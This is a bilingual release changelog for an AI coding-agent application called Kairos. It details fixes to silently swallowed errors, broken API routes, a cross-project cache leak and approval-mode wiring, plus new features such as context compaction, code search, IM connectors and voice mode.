  | `kairos/llm/scripted.py` `ScriptedProvider._record_cost` | `record_entry` | `warning`（账本是这个 provider 的意义，静默丢会让 gate 报告漏报） |
  | `kairos/loop/loop_runner.py` `_best_of_n_attempts` | `publish` | `debug`＋`exc_info`（判选与返回已定，只丢 UI 通知） |
  | `kairos/loop/loop_runner.py` `_maybe_auto_approve_plan` | `publish` | `debug`＋`exc_info`（`session.plan_*` 已提交，只丢 UI 通知） |
  | `kairos/tools/browser_tool.py` `BrowserTool._dispatch` | `record_screenshot` | `warning`（截了图却记不下地址） |
  | `kairos/tools/code_search.py` `build_semble_index._build` | `save_index_to_cache` | `debug`（纯性能缓存） |
  | `kairos/tools/terminal.py` `TerminalTool.execute` | `write` | `warning`（投进 stdin 的输入"本该送到"，但不升成用户可见错误） |
  | `kairos/demo.py` `_git_init` | `subprocess.run(git…)` | `warning`（demo 声称有真实版本历史，静默缺失是误导） |

  `loop_runner.py` 是红线文件（**用户单独授权**只动这两处处理器）：`git diff` 恰好 2 个 hunk，
  各自只把裸 `pass` 换成注释 + `logger.debug`，**计划/评分/重试逻辑一行未动**。

- **守卫口径从「只有 `pass`」扩到「静默处理器」**（`pass` / 无痕 `return` / `return None`）：
  记录 173 → 198（+25 条新增全是 `return None` 且**不围任何副作用**，逐条读其 `try` 分类入册），
  并且它自己的**过期检查**抓出 1 条被上面那笔 cli 修复自然淘汰的旧条目（机制有效），
  收口后 **9 passed**。

### Fixed

- **5 处未定义名（新守卫上线第一分钟抓出的存量）全部修掉**：

  | 位置 | 名字 | 原来的后果 | 修法 |
  |---|---|---|---|
  | `api/routes/agents.py:55` | `AgentTask` | `POST /api/agents/task` 一调就 `NameError`（被 `except` 转成 500，端点等于死的） | 函数内局部 import（模块级的 PEP-562 `__getattr__` 只在**属性访问**时触发，函数体里的裸名字根本不走它） |
  | `api/routes/cost.py:230` / `:251` | `_get_log_path` | 两个 eval 端点炸（同文件另 5 个函数都有这个 import，只有这两个漏了） | 补 import |
  | `api/routes/p2_features.py:91` | `_orch` | 自主提交的**唯一载体**发布从未发生 | 照同文件另 13 处调用点的写法 import |
  | `api/routes/projects.py:1339` | `orchestrator` | 「agent 学到了什么」记忆面板**永远空白** | 改用本文件自己的 `_orch()` shim（**不新增**顶层 `from api.deps import orchestrator`，那会踩 `api.deps` 的 monkeypatch 约定） |
  | `kairos/perf.py:168` | `field` | 死分支（`... if False else None`），无害 | 清掉死分支 |

- **自主提交接口以前会返回「已排队」，而那个任务根本跑不了。** `POST .../autonomous` 里的
  `try: await _orch().message_bus.publish("autonomous.submitted")` 配的是
  **`except Exception: pass`** ⇒ 发布失败被静默吃掉 ⇒ 调用方拿到 `200 {"status":"queued"}`，
  而工作是**注册了但永远跑不起来**。这比静默更坏：**返回体在撒谎**。
  改法有事实依据 —— 核过 `kairos/autonomous_worker.py:128-139`（`_fetch_requirement`）：
  worker 只从 `message_bus.recent()` 里按 `topic == 'autonomous.submitted'` + `job_id`
  取任务文本，取不到就把任务标 `failed` ⇒ **发布是唯一通道**。所以现在
  `logger.exception` + 把登记标 `failed` + **`HTTPException(503)`**，不再谎报 queued。

- **`p2_features.py:1007` 的 `coder.chat`（LLM 副作用）也补上了痕迹**（原来同样是静默 `pass`）。

### Added

- **未定义名守卫铺到全树**（`tests/test_startup_wiring_guard.py`）：扫 `api/` + `kairos/`，
  **0 容差**；`_UNDEFINED_NAME_ALLOWLIST` 按 `"<relpath>:<name>"` 键（行号无关）、必须带理由、
  **过期报错**，终态为空。
- **守卫精度重写**：老版本把未定义名收进一个全局名字集合、再按文件里第一个 `Load` 行报出去 ⇒
  **真错报在错行、位置信息全丢**（在 `cost.py` 上表现为 `:68` 误报、`:230/:251` 漏报）。
  现在每个 `ast.Name` 与**精确的 symtable 作用域**配对（作用域开启点↔symtable 子表的遍历，
  正确处理装饰器、参数默认值/注解、以及推导式第一个 `iter` 属于父作用域），全树 259/259 无失配。
  重写后历史红证**更强**：`git show 57221b4^:api/app.py` 喂进去会报出**全部 6 个** `_orch`
  调用点（`:115/:125/:136/:137/:152/:153`），而现行 `api/app.py` 是 0 条。
- **「不许 `except: pass` 吞掉」也成了常驻守卫**（`tests/test_pass_only_except_guard.py`，纯 `ast`，
  不用正则）：枚举 `api/` + `kairos/` 里**函数体只有 `pass`** 的 `except` 处理器。白名单键
  `"<relpath>::<qualname>::<exc>"`（行号无关）、每条必须带理由、**过期报错**；
  **围着副作用调用的不许进白名单**（错误信息直接写 "give it a trace (log/raise); do NOT add it
  to the allowlist"）。
  存量：**174 条，其中 12 条被自动标成 `DEBT:`**（并把被吞的调用名写进理由：

  | 位置 | 被吞掉的副作用 |
  |---|---|
  | `kairos/daemon.py::DaemonSupervisor._heartbeat` / `kairos/loop/loop_runner.py::_best_of_n_attempts` / `_maybe_auto_approve_plan` | `publish` |
  | `kairos/tools/terminal.py::TerminalTool.execute` | `write` |
  | `api/routes/websocket.py::collaboration_ws` | `send_json` |
  | `kairos/daemon.py::DaemonSupervisor.start` | `write_text` |
  | `kairos/tools/browser_tool.py::BrowserTool._dispatch` | `record_screenshot` |
  | `kairos/tools/code_search.py::build_semble_index._build` | `save_index_to_cache` |
  | `kairos/weixin_ilink.py::WeixinChannel.stop_account` | `notify_stop` |
  | `kairos/llm/scripted.py::ScriptedProvider._record_cost` | `record_entry` |
  | `kairos/cost.py::litellm_cost_callback` | `is_recording` |
  | `kairos/observability.py::_OtelSpanAdapter.record_exception` | `record_exception` |

  ）等一次专门清理（**其中 2 条在红线文件 `loop_runner.py` 里，需要单独授权**）；其余 162 条是
  「无可识别副作用」（清理/可选探测/取消），自动分类入册。
  **已知局限（如实）**：判定"有没有副作用"靠一份**固定的动词表** ⇒ 某个表外的副作用调用被静默
  吞掉时会被误归入无害那类；12 条 `DEBT` 说明这套分类能抓住主要的那批。

### Fixed

- **微信 / 企微 / IM 发的东西在网页聊天页看不到。** 网页线程**只读库**（`GET /{id}/chat-messages`
  → `Persistence.load_messages(chat_only=True)`，只认 `CHAT_TOPICS`）；四个入站入口里只有网页端
  **既**把用户那条落库成 `user.chat`（`projects.py:544`）**又**把通用车道的回复发上总线
  （`:429`）。微信与企微**两边都缺**（grep 实测各 0 处），IM 缺回复那半边 ⇒ 你在网页上打开
  项目，看不到对方在微信里说了什么，闲聊的回复也不在。

  照 `im.py:477-487`（落库模板）与 `projects.py:426-441`（回复上总线模板）把三个通道补齐：

  | 模块 | 进消息 `user.chat` | 通用车道回复 `agent.chat` |
  |---|---|---|
  | `projects.py`（网页，原本就对） | 2（未动） | 1（未动） |
  | `im.py` | 1（未动） | **0 → 1** |
  | `wecom.py` | **0 → 1** | **0 → 1** |
  | `weixin.py` | **0 → 1** | **0 → 1** |

  - **落库用折好附件块后的提示词**（`prompt`，即 agent 实际看到的内容）⇒ 与网页端一致；
    metadata 带 `project_id` + `source`（`weixin`/`wecom`/`im`）+ `account_id`/`chat_id`，
    以后排查能一眼看出这条从哪来。
  - **绝不双气泡**：通道层**只在通用车道成功返回之后**发布回复；Coder 车道的
    `project.coder.chat()` 自己会发 `agent.chat`（`kairos/agents/base.py:1232`），而所有
    Coder 回退分支都在发布之前 `return`。
  - **历史是锦上添花**：所有落库/发布都 `try/except` + 只记日志 ⇒ **任何失败都不改变回复、
    也不影响出站发送**（发不出去比看不到历史严重得多）。有测试注入「`save_message`/`publish`
    抛异常」并断言回复**逐字不变**。
  - **新守卫 `tests/test_channel_history_parity.py`**：对每个入站通道模块断言「有把进消息落成
    `user.chat`」+「通用车道会发 `agent.chat`」，白名单条目必须带理由、**过期会被报出来**。
    **红→绿双证**：修前它逐条指名 `wecom.py`/`weixin.py`（进消息）与 `im/wecom/weixin`
    （回复）；修后 18 条全绿。**父任务独立复验**：把 `wecom.py` 的落库临时改名 → 守卫立刻
    报红并指名它 → 还原后绿。
  - **局限（如实）**：**无真机验证**——没有真微信/企微账号，全部离线（假 client/stub）；
    「打开网页看到微信那条」只在**数据层边界**（落库 + 上总线）被证明，没有对着真 UI + 真 bot
    跑过。两条守卫检查是**源码级**（AST），观察不到活的 WebSocket 渲染。

- **前端一直在调、后端不存在的三个端点：现在按前端的现有契约做出来了。** 与「检查点面板」
  同一类（两层各自都有、中间对不上），但这次是**只有前端有、后端没有**：
  `GET /projects/{id}/stats`（Loop 页的分数条形图 / tokens / 失败连击 / 无进展计数卡片）、
  `GET /projects/{id}/plan/visualization`（计划 Mermaid 图 + 文件树）、
  `POST /projects/{id}/requirements`（需求框的草稿自动保存，失败静默）。三个都在意会中被
  `.catch(() => null)` 吞掉 ⇒ 卡片不显示、草稿从不保存，谁都不知道。**只加后端、不动前端**
  （调用本来就在，让声称变成真的；不需要重打前端包）。

  - **`/stats`**：字段全部从 `LoopSession` 映射（`rounds` 由 `session.history` 映射，
    **回滚行被显式跳过**，不会被误当成一次 `approve=False`；`score_window` /
    `total_tokens_used` / `infra_failure_streak` / `no_progress_count` / `running`）。
    **`approximate_cost_usd` 恒为 `0.0`，这是如实标注的哨兵值**：花费台账（`kairos/cost.py`）
    每次 LLM 调用记一条，但**不按项目打标** ⇒ 无法得出一个真实的按项目花费，宁可返回 0 也不编。
    另：`history` 行上**没有时间戳**，`ts` 返回 `0.0`（卡片未使用该字段）——两个缺口都写在
    端点 docstring 里。没有 loop 会话时返回 **404**（前端 `.catch` 让卡片继续不显示，
    比渲染一张「0 轮 0 问题」的空卡诚实）。
  - **`/plan/visualization`**：`mermaid` 优先取**结构化计划**（`kairos/loop/plan.py` 的
    `Plan`/`TodoItem`，带 `pending`/`in_progress`/`completed`，按状态上色 + 顺序边）；没有
    结构化 todos 但有计划文本时，把**计划自己的行**渲染成节点，并在图内用 `%%` 注释
    **明说这是「计划原文的呈现、不是模型生成的图」**。所有标签经统一转义
    （换行→`<br/>`、`&`/`<`/`>`/`"`/`#` 全部转义，节点 id 另行生成）⇒ **计划文本里的引号、
    换行、`-->` 不会弄坏图**（有敌意输入测试兜着）。`file_tree` 复用 workbench 的文件树
    遍历，**深度 3 / 条目 200 封顶**并带截断脚注（实测 300 条 → 201 行 +
    `(+100 more entries, truncated)`）。
  - **`/requirements`**：写入 `project.requirements` + `save_project`（与 `start_loop` 启动时
    写的是**同一个字段**）⇒ 草稿能挺过刷新与重开；项目不存在 404、非字符串或超长
    （>100k）400，坏输入不会是 500。
  - **守卫白名单从 5 条缩到 2 条**：`tests/test_frontend_route_parity.py` 的 `KNOWN_MISSING`
    现在只剩两条动态枚举（都带 reason）。这个守卫正是当初把这三条照出来的东西 ⇒ 它自己
    会报「白名单过期」，所以白名单的缩短本身就是修复的证据。

- **Loop 页的「检查点 / 差异 / 回滚」面板是坏的：前端调的路径后端一个都不存在。** 这是又一起
  「静默空转」——但机制和之前几起不同：**两层都写了，中间的线从没被断言过**。后端
  `api/routes/checkpoints.py` 的路由自身写了 `/projects/{id}/checkpoints`，却又被
  `api/app.py` 以 `prefix="/api/projects"` 挂载 ⇒ 生效路径成了
  **`/api/projects/projects/{id}/checkpoints`**（前端永远调不到）；前端 `Loop.tsx` 调的是
  完全另一套单数路径 `/projects/{id}/checkpoint` 与 `/projects/{id}/diff`，后端**全无**；
  列表那次请求后面跟着 `.catch(() => null)`，**把 404 吞掉** ⇒ 面板永远空白、不报错、
  用户只会以为「没有数据」。

  修法：后端去掉路由自身多余的 `/projects`（挂载前缀不动，影响面最小）⇒ 生效路径
  `/api/projects/{id}/checkpoints…`；前端三处改调复数路径；差异视图需要的是
  **按轮次**的比较（`from_round`/`to_round` → `{patch}`），而原有的
  `checkpoints/{sha}/diff` 返回的是「检查点 vs 工作区」，答的是另一个问题 ⇒ 新增
  `GET /{project_id}/checkpoints/diff` 按轮次映射 sha 后 `git diff <from> <to>`。
  已能工作的 `POST /{project_id}/checkpoint/revert_file` 未动。

  并新增 `tests/test_frontend_route_parity.py`：扫描前端所有 `api.<method>(...)` 的静态路径
  模板，断言每一条都能在 `app.openapi()` 的真实路由表里找到且方法一致（不可静态解析的
  计数跳过、已知缺失的进**带原因的白名单**，白名单过期也会报）。**这道守卫在修复前
  逐条指名了上面三条路径**（红→绿双证）。

  顺带被它照出来的**三处同类问题**（本次未修，在白名单里可见）：
  `GET /api/projects/{id}/stats`、`GET /api/projects/{id}/plan/visualization`、
  `POST /api/projects/{id}/requirements` —— 前端在调、后端同样不存在。
  （README 曾把 `/stats` 列为已实现端点，本轮文档审计已把它删掉。）

- **读文件的内容缓存漏了「根」⇒ 一个项目能读到另一个项目的同名文件。** `file_read` 的
  结果缓存（`kairos/tools/cache.py`）是**进程级单例**，键只用**传入的路径字符串**、
  不含解析后的根 ⇒ 项目 A 读过 `a.txt` 之后，项目 B 读 `a.txt` 会**拿到 A 的内容**
  （跨项目读取泄漏）。同一根因还有第二个面：缓存自称「per-round」、由循环每轮清一次，
  而**通用车道从不清** ⇒ 闲聊车道与 Coder 的循环共用同一份陈旧条目（Coder 刚写完的文件，
  车道读到的可能还是改前内容）。修法两处：① 键改用**解析后的绝对路径**（围墙外/被拒的
  情况用 `根::路径`，使拒绝也按根隔离）；② 通用车道的读工具环在**每一轮开始时清缓存**，
  与循环遵守同一个契约。回归 `tests/test_capability_gate.py::test_read_cache_is_scoped_to_the_project_root`。

  这个缺陷是**本地全量跑才暴露**的（`test_the_lane_stops_at_the_turn_budget` 写下的
  `a.txt` 污染了同进程后面的用例）：CI 是**逐文件分片**跑，跨文件污染在 CI 里不会发生。

- **「全权访问」开关此前也是空转的：拨了没用。** 工具沙箱的判定 `is_full_access()`
  只读进程环境变量 `KAIROS_FULL_ACCESS`，而界面上的开关（`settings.json:fullAccess`，
  `POST /api/projects/settings` 写入）**从来没有被任何人读过**——所以拨开关只改它自己的
  显示，文件工具照样被围在项目目录里（新装的机器上表现为"除了 C 盘其他盘都读不到"）。
  现在判定读三层，任一为真即开：环境变量 → 经 `kairos.config.settings` 加载的 `.env`
  字段（pydantic-settings 会把值放上 Settings 对象、而不是 `os.environ`，所以此前写进
  `.env` 的 `KAIROS_FULL_ACCESS` 同样无效）→ `settings.json:fullAccess`。
  判据每次调用重算，改完立即生效、无需重启。

  顺带：`tests/test_terminal_shell_selection.py::test_metadata_reports_no_shell_when_sandboxed`
  此前隐含假设"不设任何开关就是沙箱态"，在带 `settings.json` 的环境里必然失败；现改为在用例
  内显式 patch（不依赖环境），断言本身未放宽。

- **「全自动模式」此前是空转的：选和不选没有任何区别。** `approval_mode` 只有写入
  （设置接口）和一个回读给 UI 的 getter，而 `get_sentinel()` 永远构造 SUGGEST 模式
  的哨兵——界面上选 full-auto 对 agent 的实际行为毫无影响，它照样每一项都问你。
  现在把线接上：

  - 项目上的选择落到 `project.metadata["approval_mode"]`（与 `coder_mode` 同一个
    家，重启后仍在）；attach 时由 `Sentinel.set_mode()` 推给真正做判定的那个 gate；
  - 设置接口的 PUT 立刻作用到正在运行的 gate，不必等下一次 attach；
  - 新增进程级上限 `KAIROS_APPROVAL_MODE`（不设 = 不限制）。**上限与项目设置取更严
    的那个**：项目可以比进程上限更保守，绝不能更松——否则几个月前写进库里的一行，
    就能放开运维显式收紧过的进程；
  - `full-auto` 的含义仍是「没有显式 deny 就不问」：策略里的 deny 规则照旧优先，
    `terminal` 的 DENY_PATTERNS 硬拦也不受它影响（那是另一层）；
  - GET 现在同时返回 `mode`（项目记录，UI 显示的那个）与 `effective`（gate 实际
    在跑的那个）；进程上限收紧时两者会不同。

  15 个用例：设置到达判定、默认仍是 SUGGEST、deny 在 full-auto 下依然是 deny、
  上限只收紧不放松、未知值回落到最安全的模式。

## [0.1.8] - 2026-10-05

### Fixed

- **聊天的长回复在页面上被裁掉——真因是布局，不是数据。** `ChatThread` 自己写死
  `height: calc(100vh - 52px)`，而它嵌在「页面头部 + 输入区」下面的 flex 槽位里：
  盒子比槽位高约 190px，槽位的 `overflow: hidden` 把底部剪掉，而内部滚动条覆盖的
  是那个更高的盒子——滚到底，最后一段仍在裁剪区外，往上滚也到不了真正的开头。
  现在线程填满槽位（`height: 100%` + 父级 `minHeight: 0`）。排查方法一并记住：
  先读渲染后的 DOM，看到第一行就是用户的输入、回复长度与库里那条一致，于是确定
  内容没丢、问题在视口。`tests/test_chat_thread_fills_its_slot.py` 把它钉住——
  jsdom 没有布局引擎，渲染式测试永远抓不到裁剪，只能做源码级断言。

- **agent 回复被砍到 2000 字符。** `kairos/agents/base.py` 的两处发布点（话题
  `agent.response` 与 `task.result`）改用 `MAX_PUBLISHED_TEXT = 200_000`。原注释说
  「别让 50KB JSON 灌爆总线」，但同一段文本早已通过 `stream.chunk` 逐字进库，
  在这里截断省不下任何东西，只把用户看到的回复切成半句。

- **没选中会话时，循环历史整段消失。** 轮次摘要（每轮的 Coder/Reviewer 记录）原先
  只走 `<session_id>/rounds` 这一条路径，一旦打开页面时没有活跃会话（例如不再自动
  进入最近会话之后）它就不执行。新增项目级 `GET /api/projects/{project_id}/rounds`，
  不依赖会话。

- **LLM 超时被拖成十分钟。** 超时原来叠了多层重试（应用层 5 次 × SDK 自带 2 次）。
  现在超时只重试 1 次（恰好两次尝试）后抛错，并关掉 SDK 自带重试。

- **文件夹选择器在全权模式下打不开别的根目录。** 选择器接上全权开关，并去掉那些
  「能点开、但打不开」的根。

### Changed

- **短任务不再走完整循环。** 原先任何带命令式关键词的消息都会进入多轮 loop；现在
  只对真正的长任务（重构、重写、迁移、整个项目、多文件、端到端、批量，或用户显式
  要求）走 loop，其余交给单轮对话——单轮对话本身就带全套工具。同时 agent 在对话里
  的自称改为「我是 Kairos code」，不再冒出底层模型的名字。

- **左侧「新建对话」右边的箭头按钮去掉了。** 它下拉里只有一项「选择已有文件夹…」，
  而聊天输入框左下角本来就有同一个入口，属于重复。

- **打开对话页不再自动跳进最近的会话。** 以前进 `/chat` 会自动选中最近的项目并加载
  它的线程，像是「自动打开了别的东西」；现在停在项目列表，由用户自己选。

### Added

- **Kairos 可以作为团队成员被别的 agent 派活：一个仓库 = 一个常驻工人，且不要求对方遵守任何文档格式。**
  场景是主 agent（Claude Code / Codex / 人或 CI）把项目切成模块、出任务文档给 Kairos，
  Kairos 干完交代码回去审核。这条路原先有三处硬伤：`create_project` 每次
  `uuid4()` 生成新项目，等于每来一个任务就换一个失忆的同事；`kairos exec` 用临时目录
  加临时 SQLite，跑完什么都不剩；而任务文档的形状又不可能要求对方统一。

  - **一个仓库 = 一个工人。** 新增 `kairos/worker_identity.py` 与
    `<repo>/.kairos/worker.json`：从仓库路径派生稳定的 project id，第一次派发时写下来，
    以后每次都落到**同一个项目**。因为项目在启动时会从库里重新装配，而笔记、偏好、
    检查点、技能、`memory_kb.json` 全都按 project id 索引，「同一个 id」就是
    「同一个会话」——跨任务，也跨重启。`Orchestrator.attach_project()` 是幂等的；
    `create_project()` 行为不变（人点「新建项目」仍然是新的）。
  - **收任意形状的任务文档。** 新增 `kairos/intake.py`，**不要求任何格式**：
    没有 frontmatter、没有标题、没有关键字也照收。需要的信息按「文档说了 → 去仓库里查
    （AGENTS.md / README / 目录 / git log）→ 保守默认并**记为假设**」的顺序补齐。
    范围、权限、验收这三样不猜：要么文档写了，要么变成一条问题。
  - **原文可核验。** 每个任务单元带 `source_quote`，引用**必须真的出现在原文里**
    （子串校验，不是判断题）；查不出来的引用丢弃并下调把握度。这条挡住了
    「模型替我们臆想出一个没被要求过的任务」。
  - **降级而不是失败。** 没有模型、模型报错、模型返回不可解析的内容，都会退化为
    `heuristic_units()` 的结构切分，并如实标注是机械切分再附一条问题，让定时任务
    继续往前走而不是死掉。
  - **危险内容只标记、不否决。** 出现删除 / 格式化 / 凭据 / 提权等会记为 `cautions`、
    抬高风险并要求确认（退出码 4），但**不**因为一句话里有 `.env` 就拒绝干活——
    任务文档完全可能是在**禁止**碰凭据。
  - **CLI：`kairos worker attach|status|forget` 与 `kairos accept <文件>`。**
    前者只管身份（不构造 agent 栈，没 key 也能瞬间返回）；后者读一份文档后把
    「我这样理解的」「我替你做的默认」「需要你确认的问题」写进
    `<repo>/.kairos/outbox/`，退出码 0 = 明白 / 3 = 没有可执行内容 / 4 = 需要确认。
    `.kairos/.gitignore` 写 `*`，保证工人的簿记**不会出现在主 agent 要审的 diff 里**。
- **长会话不再「死于上下文」：超限自动压缩重试、旧工具结果按需回收、子代理改回摘要。**
  上下文是 agent 唯一真正稀缺的资源，而这轮之前 Kairos 在它上面有三处硬伤：
  ① 提供方回答 `400 prompt is too long` 时异常直接抛出、整个 run 以「Error: ...」
  结束——对方明明已经告诉我们哪里不对；② 几十轮前的工具原始输出仍然每一轮都在
  花 token，而它对当前推理几乎已无价值；③ 子代理花几万 token 探索回来，父 agent
  拿到的是**硬截断的前 5000 字符**，那不是摘要，只是碰巧排在前面的一段。

  - **超限即压缩重试。** 新增 `kairos/llm/errors.is_context_length_error()` 识别
    各家各种写法的「太长」（`context_length_exceeded`、`prompt is too long`、
    `maximum context length`、HTTP 413……，也能看穿 `ResilientProvider` 的重试包装）。
    run 循环与 chat 路径收到它之后各重试一次：把 token 预算减半（下限 8k，让
    `_truncate_memory` 从此更克制）、立刻重生成 running summary，再用
    `shrink_for_overflow()` 构造一个**严格更小**的请求。第二次仍被拒才照常报错。
    非超限错误（连接重置、401、429）行为完全不变。
  - **旧工具结果清理（最轻量的压缩）。** 新增 `kairos/context_governor.py`：组装
    请求时把最近 4 条以外的 `role="tool"` 消息正文换成一行占位说明，`tool_call_id`
    与 `name` 原样保留，因此工具调用配对不受影响。**纯函数、不改动已存记忆**——
    会话仍留着全文，随时可以重跑工具或再读一次；这也是它能每一轮都做、而不必等到
    着火才做的原因。
  - **子代理改为「带回结论，原文留在磁盘」。** `spawn_subagent` 的结果先用父
    agent 自己的模型蒸馏成结论式摘要（保留答案、文件:行号、命令、未决问题；丢弃
    过程叙述），完整报告写到 `<data_dir>/subagent_outputs/<child>.md` 并把路径一并
    返回，需要细节时按需读取。落盘前过 `sentinel.redact()`，旧报告按 14 天 /
    200 份自动清理。短结果直接透传（不做无意义的一次 round-trip），蒸馏失败则
    退回原来的定长截断——只会比过去更好。
  - **修复：循环器里的 compaction 从来没有真正跑过。** `loop_runner.py` 以
    `maybe_compact(msgs, rounds=...)` 调用并解包成两个返回值，而该函数的签名是
    `maybe_compact(history, *, threshold, keep_recent)`、返回单个列表——每次调用都
    抛 `TypeError`，被外层 `except` 吞成 debug 日志，算出的结果也被丢弃。现在由
    agent 自己的 `compact_now()` 承担（run 循环里另一个 LLM 就在手边），返回值明确
    表示是否真的压缩了，日志级别也从 debug 提到 info。
  - `compact_now()` / `_maybe_summarize_memory(force=)` / `maybe_compact()` 三层都
    承诺**永不抛出**：压缩是优化，一个能把长循环杀掉的优化是 bug。
  - 新增 4 个离线测试文件（34 项）：`test_context_governor.py`、
    `test_overflow_recovery.py`（假的「窗口很小」提供方，重试若不更小会再次被拒，
    因此这些测试**不可能**在没有真压缩的情况下通过）、`test_subagent_distill.py`、
    `test_compact_now.py`。

- **`code_search`：让 agent 按「意思」找代码，而不是靠 grep 猜关键字。**
  agent 探索代码库一直是 grep + read——先猜一个标识符，再整篇整篇读文件。知道
  名字时又快又准，不知道时又贵又慢。新增的 `code_search` 工具用 MIT 许可的
  [semble](https://github.com/MinishLab/semble)（纯 CPU、无 API key、无需 GPU 的
  本地语义检索）把「哪里处理了 X」变成几段真正相关的代码片段，每段带
  `文件:起始行-结束行` 和相似度分数，而不是一个文件；在真实代码库上相比
  grep + read 约省 99% token。首次搜索会建一次本地索引（略慢），之后走缓存。

  - **没装 semble 也不会弄崩 Kairos。** 后端只在真正调用时才懒导入，工具的构造
    阶段完全不碰它；缺失时只由这一个工具返回一条可读错误，服务照常启动。
  - **阻塞不卡事件循环。** 建索引和检索都是 CPU 密集、可能耗秒的操作，整体丢进
    `asyncio.to_thread` 的工作线程。
  - **结果在工具这一层限长。** 每段按 `max_snippet_lines` 截断，整个 payload 上限
    50000 字符（与 grep 一致），避免一次搜索淹没上下文。
  - 索引由 semble 自动做磁盘缓存与增量重建（Windows 落在
    `%LOCALAPPDATA%\semble\Cache`）；`refresh=true` 可强制重建。
  - 注册进 Coder 与 Reviewer 的两处工具列表（`orchestrator.py` 与
    `project_factory.py`），并加入只读工具允许清单（`coder_modes`、`approval`）
    与 tainted-run 的禁读机密名单（`sentinel`），使这个只读工具在 read-only 模式
    下不会被默认拒绝。
  - 依赖 `semble` 声明进主 `dependencies`（不是 optional extra，要打进冻结 exe），
    其运行时依赖 `numpy` 一并显式列出。新增 `tests/test_code_search_tool.py` 共
    22 个离线测试：全部注入假索引，不联网、不加载真实模型。

- **微信官方 ClawBot / iLink 通道有了桌面入口，二维码改由后端直接出图。**
  这条通道的后端（扫码登录 / 多账号 / 长轮询收发）上一步已经完成，但只能用
  curl 调；这轮把它放到了用户面前，同时去掉了「前端得自己渲染二维码」的需要：

  - `GET /api/weixin/login/qr.png` 用 `segno`（纯 Python，进了运行依赖）把登录
    二维码渲染成 PNG —— 手机能扫的真二维码，8px/模块 + 规范要求的 4 模块静默
    区。省略 `qrcode` 时内部先取一张新码再出图，一次请求就拿到图，并在
    `X-Weixin-Qrcode` 响应头里给出轮询用的 id；带 `?qrcode=<id>` 则复用会话并按
    id 缓存，不重复渲染。图片编码的只是 `liteapp.weixin.qq.com` 链接，响应里
    没有 token。
  - 左下角新增 **📱 微信** 入口（在 `SidebarFooter`，和语音 / 机器人并排），点开
    是右侧弹层 `WeixinPanel`：一键出码、轮询扫码状态（等待扫码 / 已扫码待确认 /
    需要配对码 / 过期重生成 / 已绑定）、二维码可点开放大、已绑定账号列表与删除、
    多账号「再扫一个」。任何未识别的 `status` 都落到「等待中」的提示上，不会白屏；
    后端不可达 / 超时 / 非 200 时显示可读错误，不抛异常。
  - 新增 30 个 i18n 键（`web/src/i18n/parts/weixin.json`），组件里没有硬编码中文。
    61 个 catalog 因此暂时从 100% 降到 1336/1366（约 97.8%），缺口恰好是这些新键，
    未翻译前按既有回退规则显示英文。

- **Voice mode.** The synthesis engine has been in `kairos/voice.py` since early
  on — several hundred neural voices, no key, no account to create — and nothing
  called it: no endpoint, and a settings field that was a text box nobody read.
  It is wired up now. `GET /api/voice/voices` serves the list, with the
  browser's own voices kept as a second group and as the fallback for when the
  server has no engine or no network; `POST /api/voice/speak` returns the audio
  for a reply; the voice panel picks from the real list instead of asking you to
  type a voice name. Pace, pitch and volume reach the engine rather than
  being accepted and dropped.

  Voice mode is also a change of register, not just a speaker: with it on, the
  chat path tells the agent its answer will be heard rather than read, so the
  reply is written short and without Markdown in the first place. Whatever still
  arrives as a wall of text is distilled on the way to the speaker —
  `kairos/voice_text.py` drops fenced code, tables, links and list bullets,
  keeps whole sentences up to a budget, and cuts at the `Details:` marker the
  directive asks for, so the specifics stay on screen and the summary goes to
  the ear. The reply itself is unchanged; only what is spoken is trimmed.

  The frozen desktop build installs the new `tts` extra. `voice` also carries
  the speech-*in* half (`faster-whisper`), and an executable that ships a model
  runtime it never uses is larger for no reason. For the same class of reason
  the persisted v1 voice setting is cleared on upgrade: it named an English
  voice, which reads a Chinese reply in English. An empty name now means "match
  the reply's language", and a voice the user actually chose is left alone.

  With voice mode on, the chat is hands-free. The mic opens by itself whenever
  the agent is idle; a phrase is submitted after five seconds of quiet rather
  than when the user reaches for the mouse; the mic is taken away while the
  agent works — otherwise the recogniser transcribes the agent's own voice and
  sends it back — and reopened when the reply is done. The box is emptied for
  each turn, and a refused microphone is never retried: one denial would
  otherwise become a restart loop.

- **Bots: many IM accounts, one deployment, and no crossed wires.** A connector
  that drives a chat client — a personal WeChat login, say — lives outside this
  repository on purpose: it holds a login, it injects into one desktop client
  build, and neither belongs in an open-source tree. What the app owes it is a
  protocol, and what the user owes themselves is a way to see it. Both are here:
  `kairos/im_accounts.py` holds the accounts, the per-conversation bindings and
  the reply queue, and `api/routes/im.py` exposes them.

  Two small, load-bearing decisions make "several accounts at once" safe.
  Bindings are keyed `(account_id, chat_id)` rather than by chat id alone — the
  Feishu table keys on `chat_id`, and two accounts that happen to see the same
  opaque id would silently share a workspace. And the app never sends anything
  itself: it queues the reply and the connector that owns that account's login
  collects it, so a message cannot physically leave through the wrong account.
  Collection does not consume — the connector acknowledges after sending, so a
  crash mid-send repeats a line instead of losing one — and both the queue and
  the acknowledgement are scoped to a single account, since an unscoped ack
  would let one connector mark another's mail as delivered.

  Every conversation gets its own project, which already means its own workspace
  directory, agent instance and checkpoints; that is the isolation boundary, not
  a second mechanism beside it. Connectors authenticate as exactly one account,
  with an HMAC over the timestamp and body that is keyed by that account's own
  secret (five-minute window, so a captured request is not replayable), and fail
  closed on every count: unknown account 404, disabled account 403, account with
  no secret 403, bad or stale signature 401.

  Voice mode and the bot connector open from the **bottom-left of the rail**,
  next to Settings and the theme switch: both are things you reach for while
  working, and the drawer had grown a tab for each. The connector panel shows
  the three endpoints — inbound, outbound, acknowledge — before it shows
  anything else, with a real account id filled in once one exists: an endpoint
  you cannot find is an endpoint that does not exist. `scripts/im_connector_sim.py` is the reference
  connector, and runs the whole path (create an account, send a message, collect
  the reply) with no chat client involved.

  Connecting is **one button and one QR code**. The user clicks; the app makes a
  five-minute pairing; the connector on their machine claims it, uploads the
  chat client's own login QR, and reports the account it is now logged in as;
  the account exists, with a secret this side generated and handed over in that
  same handshake. Nobody has to invent an account id before their chat client
  has even logged in, and nobody copies a secret into a config file. The account
  id, the secret and the endpoints stay on the panel — they are what the
  *connector* needs, not what the user should have to produce. The simulator's
  `pair` command plays the connector's half, so the whole handshake can be
  walked through locally.

  Both this panel and the Voice one above are worth a note on their own account:
  each existed as a component while nothing mounted it, so neither could be
  reached from the UI at all — and the tests that did exist rendered the panel
  directly, which cannot see that. Their tests ask the rail now, and assert why
  the panel exists (the endpoints, the switch) rather than that it renders.

